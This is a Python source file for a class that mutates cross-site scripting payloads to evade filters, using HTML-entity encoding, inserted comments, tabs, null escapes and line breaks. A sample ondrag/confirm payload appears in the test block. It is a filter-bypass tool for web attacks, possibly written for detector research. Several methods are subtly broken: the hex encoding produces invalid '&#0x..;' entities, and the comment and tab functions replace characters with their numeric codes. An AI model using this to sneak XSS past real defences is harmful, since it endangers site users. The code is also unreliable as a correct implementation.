import random
import re

class Xss_Manipulator(object):
    def __init__(self):
        pass

    ACTION_TABLE = {
    'charTo16': 'charTo16',    # 随机字符转16进制，比如：a转换成&#x61
    'charTo10': 'charTo10',    # 随机字符转10进制，比如：a转换成&#97
    'charTo10Zero': 'charTo10Zero',    # 随机字符转10进制并加入大量0，比如：a转换成&#000097；
    'addComment': 'addComment',     # 插入注释，比如：/*abcde*/
    'addTab': 'addTab',     # 插入Tab制表符
    'addZero': 'addZero',   # 插入 \00 ，其也会被浏览器忽略
    'addEnter': 'addEnter',     # 插入回车
    }

    def modify(self, str, action):
        action_func = getattr(self, action)

        return action_func(str)

    #现在将免杀操作都写出来，都差不太多，后续再慢慢添加，这里用了很多re的方法
    def charTo16(self, str):
        matchStr = re.findall(r'[a-qA-Q]', str, re.M | re.I)
        if matchStr:
            modify_char = random.choice(matchStr)
            modify_char_16 = "&#{};".format(hex(ord(modify_char)))
            str = re.sub(modify_char, modify_char_16, str, count=random.randint(1, 3))
        return str

    def charTo10(self, str):
        matchStr = re.findall(r'[a-qA-Q]', str, re.M | re.I)
        if matchStr:
            modify_char = random.choice(matchStr)
            modify_char_10 = "&#{};".format(ord(modify_char))
            str = re.sub(modify_char, modify_char_10, str, count=random.randint(1, 3))
        return str

    def charTo10Zero(self, str):
        matchStr = re.findall(r'[a-qA-Q]', str, re.M | re.I)
        if matchStr:
            modify_char = random.choice(matchStr)
            modify_char_10 = "&#0000{};".format(ord(modify_char))
            str = re.sub(modify_char, modify_char_10, str, count=random.randint(1, 3))
        return str

    def addComment(self, str):
        matchStr = re.findall(r'[a-qA-Q]', str, re.M | re.I)
        if matchStr:
            modify_char = random.choice(matchStr)
            modify_char_comment = "{}/*4444*/".format(ord(modify_char))
            str = re.sub(modify_char, modify_char_comment, str, count=random.randint(1, 3))
        return str

    def addTab(self, str):
        matchStr = re.findall(r'[a-qA-Q]', str, re.M | re.I)
        if matchStr:
            modify_char = random.choice(matchStr)
            modify_char_tab = "   {}".format(ord(modify_char))
            str = re.sub(modify_char, modify_char_tab, str, count=random.randint(1, 3))
        return str

    def addZero(self,str):
        matchObjs = re.findall(r'[a-qA-Q]', str, re.M | re.I)   # 正则
        if matchObjs:
            modify_char=random.choice(matchObjs)
            modify_char_zero="\\00{}".format(modify_char)
            str=re.sub(modify_char, modify_char_zero, str, count=random.randint(1, 3))
        return str

    def addEnter(self,str,seed=None):
        matchObjs = re.findall(r'[a-qA-Q]', str, re.M | re.I)
        if matchObjs:
            modify_char=random.choice(matchObjs)
            modify_char_enter="\\r\\n{}".format(modify_char)
            str=re.sub(modify_char, modify_char_enter, str, count=random.randint(1, 3))
        return str

#测试
if __name__ == '__main__':
    f =Xss_Manipulator()
    str = "><h1/ondrag=confirm`1`)>DragMe</h1>"
    print(f.modify(str, 'charTo16'))
    print(f.modify(str, 'addComment'))